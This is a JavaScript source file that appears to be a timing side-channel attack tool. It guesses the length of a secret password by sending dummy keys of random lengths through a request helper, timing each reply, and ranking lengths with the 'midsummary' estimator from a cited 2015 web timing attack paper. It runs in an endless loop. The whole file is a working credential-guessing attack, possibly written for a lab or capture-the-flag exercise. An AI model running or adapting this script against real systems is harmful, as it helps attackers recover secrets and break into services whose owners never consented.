const Statistics = require('statistics.js');
const { makeRequest } = require("./lib/request");

const MAX_PWD_LEN = 32;
const N_OBSERVATIONS_PER_ROUND = 20;
// multiply by some small positive integer (1 < n < 10)
// to make sure we "warm up" before doing actual measurements.
// Probably not necessary, but also useful to fully refresh
// the list of measurements b/w rounds.
const REPORT_EVERY_N_OBSERVATIONS = 2 * N_OBSERVATIONS_PER_ROUND * MAX_PWD_LEN;

/**
 * @typedef {[seconds: number, nanoseconds: number]} TimeSpan
 */

/**
 * @param t1 {TimeSpan}
 * @param t2 {TimeSpan}
 * @return {TimeSpan}
 */
function min(t1, t2) {
  const [s1, ns1] = t1, [s2, ns2] = t2;
  if (s1 + s2 === 0 && Math.min(ns1, ns2) === ns1) {
    return [s1, ns1];
  }
  if (s1 + s2 > 0 && Math.min(s1, s2) === s1) {
    return [s1, ns1];
  }
  if (s1 === s2 && Math.min(ns1, ns2) === ns1) {
    return [s1, ns1];
  }
  return [s2, ns2];
}

/**
 * @param t1 {TimeSpan}
 * @param t2 {TimeSpan}
 * @return {number}
 */
function compare(t1, t2) {
  const [s1, ns1] = t1, [s2, ns2] = t2;
  if (s1 === s2 && ns1 === ns2) {
    return 0;
  }
  const [minS, minNs] = min([s1, ns1], [s2, ns2]);
  if (minS === s1 && minNs === ns1) {
    return 1;
  }
  if (minS === s2 && minNs === ns2) {
    return -1;
  }
}

/**
 * @param t {TimeSpan}
 * @return {number}
 */
function timeSpanToNumber(t) {
  return t[0]*1e9 + t[1];
}

/**
 * @param n {number}
 * @return {TimeSpan}
 */
function numberToTimeSpan(n) {
  const s = Math.trunc(n / 1e9);
  const ns = Math.trunc(n - s*1e9);
  return [s, ns];
}

/**
 * Implements "midsummary" L-estimator from "Web Timing Attacks Made Practical" (Morgan & Morgan, 2015)
 * @see <https://www.blackhat.com/docs/us-15/materials/us-15-Morgan-Web-Timing-Attacks-Made-Practical-wp.pdf>
 * @param ts {TimeSpan[]}
 * @return {TimeSpan}
 */
function midsummary(ts) {
  const w = 10;
  const stats = new Statistics([], {});
  const numbers = ts.map(timeSpanToNumber);
  const l = stats.quantile(numbers, (50 - w)/100);
  const r = stats.quantile(numbers, (50 + w)/100);
  const mean = stats.mean([l, r]);
  return numberToTimeSpan(mean);
}

/**
 * Observations data, a map from password length to round trip times (RTT)
 * @type {{
 *   [key: number]: {
 *     observations: TimeSpan[],
 *     count: number,
 *   }
 * }}
 */
const observations = {};

/**
 * Total number of performed observations.
 * @type {number}
 */
let totalObservations = 0;

/**
 * Counting how many times each password length came out on top,
 * i.e., #1 in the list of longest observations (aggregated via some function)
 * @type {{
 *   [key: number]: number
 * }}
 */
const topPlaces = {};

async function guessLength() {
  const randomLen = Math.floor(Math.random() * MAX_PWD_LEN) + 1;
  const dummyKey = '0'.repeat(randomLen);

  const [data, tDiff] = await makeRequest(dummyKey);

  const currentObservations = observations[randomLen]?.observations ?? [];
  const currentCount = observations[randomLen]?.count ?? 0;
  observations[randomLen] = {
    observations: [tDiff, ...currentObservations].slice(0, N_OBSERVATIONS_PER_ROUND),
    count: currentCount + 1,
  };
  totalObservations += 1;

  if (totalObservations % REPORT_EVERY_N_OBSERVATIONS === 0) {
    const top = Object.keys(observations)
      .map(len => [len, midsummary(observations[len].observations), observations[len].count])
      .sort((a, b) => compare(a[1], b[1]));
    const [topLen] = top[0];
    if (topPlaces[topLen] == null) {
      topPlaces[topLen] = 0;
    }
    topPlaces[topLen] += 1;

    const report = Object.keys(topPlaces).map(l => [l, topPlaces[l]])
      .sort((a, b) => b[1] - a[1])
      .slice(0, 5) // report only top 5
      .map(row => `${row[0].padStart(2, ' ')} was the slowest ${row[1]} time(s)`)
      .join("\n");
    console.log("\n" + report);
  }

  setTimeout(() => guessLength(), 0);
}

// start the infinity loop, finish by pressing Ctrl-C
guessLength();
